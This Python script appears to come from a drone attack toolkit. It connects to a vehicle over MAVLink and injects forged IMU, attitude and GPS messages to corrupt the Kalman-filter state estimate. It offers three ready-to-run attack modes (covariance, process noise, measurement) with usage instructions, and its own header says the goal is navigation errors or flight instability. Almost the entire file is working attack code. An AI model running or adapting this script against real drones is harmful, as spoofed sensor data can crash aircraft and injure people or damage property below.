#!/usr/bin/env python3
"""
Kalman Filter Attack
Attack Kalman filter algorithms to cause incorrect state estimation

Exploits vulnerabilities in Kalman filter implementations to cause
incorrect state estimation, leading to navigation errors or flight instability.

CVSS Score: 6.0 (Medium)
Affected: Drones using Kalman filters for state estimation
"""

import sys
import time
from pymavlink import mavutil

def attack_kalman_filter(connection_string, attack_method='covariance'):
    """
    Attack Kalman filter algorithm
    
    Args:
        connection_string: MAVLink connection string
        attack_method: Attack method ('covariance', 'process_noise', 'measurement')
    """
    try:
        print("[*] Kalman Filter Attack")
        print(f"[*] Attack method: {attack_method}")
        print(f"[*] Connecting to {connection_string}...")
        
        # Use helper function for connection
        import sys
        from pathlib import Path
        sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
        from mavlink_helper import connect_to_drone
        
        master = connect_to_drone(connection_string, timeout=5)
        if master is None:
            return False
        print("[+] Connected to vehicle")
        
        target_system = master.target_system
        target_component = master.target_component
        
        print("[*] Attacking Kalman filter...")
        
        if attack_method == 'covariance':
            attack_covariance_matrix(master, target_system, target_component)
        elif attack_method == 'process_noise':
            attack_process_noise(master, target_system, target_component)
        elif attack_method == 'measurement':
            attack_measurement_model(master, target_system, target_component)
        else:
            print(f"[-] Unknown attack method: {attack_method}")
            return False
        
        print("[+] Kalman filter attack completed")
        return True
        
    except Exception as e:
        print(f"[-] Attack failed: {e}")
        return False

def attack_covariance_matrix(master, target_system, target_component):
    """Attack by manipulating covariance matrix"""
    print("[*] Attacking covariance matrix...")
    print("[*] Injecting data to corrupt covariance estimation...")
    
    # Send sensor data with incorrect uncertainty
    for i in range(40):
        # Send IMU data with unrealistic values
        master.mav.raw_imu_send(
            0,
            i * 500,  # X accel (increasing, unrealistic)
            -i * 500,  # Y accel (decreasing, conflicting)
            i * 250,  # Z accel
            i * 50,  # X gyro
            -i * 50,  # Y gyro
            i * 25,  # Z gyro
            0, 0, 0
        )
        time.sleep(0.1)
    print("[+] Covariance matrix attack attempted")

def attack_process_noise(master, target_system, target_component):
    """Attack by manipulating process noise"""
    print("[*] Attacking process noise model...")
    print("[*] Injecting data to corrupt process noise estimation...")
    
    # Send rapid, conflicting sensor updates
    for i in range(30):
        # Rapid attitude changes
        master.mav.attitude_send(
            0,
            (i % 5) * 1.0,  # Rapid roll oscillation
            (i % 5) * 1.0,  # Rapid pitch oscillation
            (i % 5) * 1.0,  # Rapid yaw oscillation
            20.0, 20.0, 20.0  # High rotation rates
        )
        time.sleep(0.1)
    print("[+] Process noise attack attempted")

def attack_measurement_model(master, target_system, target_component):
    """Attack by corrupting measurement model"""
    print("[*] Attacking measurement model...")
    print("[*] Injecting corrupted measurements...")
    
    # Send conflicting measurements from different sensors
    for i in range(35):
        # GPS says one position
        master.mav.gps_raw_int_send(
            0, 3,
            int(37.7749 * 1e7),
            int(-122.4194 * 1e7),
            100000, 65535, 65535, 65535, 65535, 65535
        )
        
        # But IMU says different motion
        master.mav.raw_imu_send(
            0,
            i * 1000,  # Conflicting acceleration
            -i * 1000,
            i * 500,
            0, 0, 0, 0, 0, 0
        )
        
        time.sleep(0.1)
    print("[+] Measurement model attack attempted")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 kalman_filter_attack.py <connection> [attack_method]")
        print("\nArguments:")
        print("  connection    MAVLink connection string (e.g., udp:127.0.0.1:14550)")
        print("  attack_method Method: covariance, process_noise, measurement (default: covariance)")
        print("\nExamples:")
        print("  python3 kalman_filter_attack.py udp:127.0.0.1:14550")
        print("  python3 kalman_filter_attack.py udp:127.0.0.1:14550 measurement")
        print("\nKalman Filter Attack")
        print("CVSS Score: 6.0 (Medium)")
        print("Affected: Drones using Kalman filters for state estimation")
        sys.exit(1)
    
    connection = sys.argv[1]
    attack_method = sys.argv[2] if len(sys.argv) > 2 else 'covariance'
    
    attack_kalman_filter(connection, attack_method)

if __name__ == "__main__":
    main()
